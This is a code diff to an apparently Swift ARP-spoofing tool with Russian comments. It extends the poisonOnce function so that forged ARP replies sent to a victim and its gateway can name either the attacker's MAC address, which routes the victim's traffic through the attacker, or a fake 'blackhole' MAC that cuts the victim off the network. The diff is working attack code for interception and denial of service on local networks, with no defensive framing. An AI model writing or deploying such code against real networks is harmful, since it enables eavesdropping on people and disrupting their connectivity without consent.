@@ -178,20 +178,24 @@ public final class ARPSpoofer: ARPSpoofing {
         return nil
     }
 
-    /// Одна итерация отравления: сообщаем жертве, что gatewayIP — на нашем MAC
+    /// Одна итерация отравления: сообщаем жертве, что gatewayIP — на MAC `route`
     /// (и симметрично шлюзу про жертву, если не oneway).
+    /// `route` по умолчанию — наш MAC (трафик идёт через нас). Если передать
+    /// несуществующий «blackhole» MAC — трафик жертвы уходит в никуда (отрезан),
+    /// даже когда глобальный forwarding включён (нужно для monitor-режима).
     public func poisonOnce(victimIP: IPv4Address, victimMAC: MACAddress,
                            gatewayIP: IPv4Address, gatewayMAC: MACAddress,
-                           oneway: Bool) {
+                           oneway: Bool, route: MACAddress? = nil) {
+        let r = route ?? iface.mac   // кем прикидываться: наш MAC (through) или blackhole
         let toVictim = buildARPFrame(op: .reply,
-                                     senderMAC: iface.mac, senderIP: gatewayIP,
+                                     senderMAC: r, senderIP: gatewayIP,
                                      targetMAC: victimMAC, targetIP: victimIP,
                                      ethDst: victimMAC, ethSrc: iface.mac)
         try? bpf.send(toVictim)
 
         if !oneway {
             let toGateway = buildARPFrame(op: .reply,
-                                          senderMAC: iface.mac, senderIP: victimIP,
+                                          senderMAC: r, senderIP: victimIP,
                                           targetMAC: gatewayMAC, targetIP: gatewayIP,
                                           ethDst: gatewayMAC, ethSrc: iface.mac)
             try? bpf.send(toGateway)
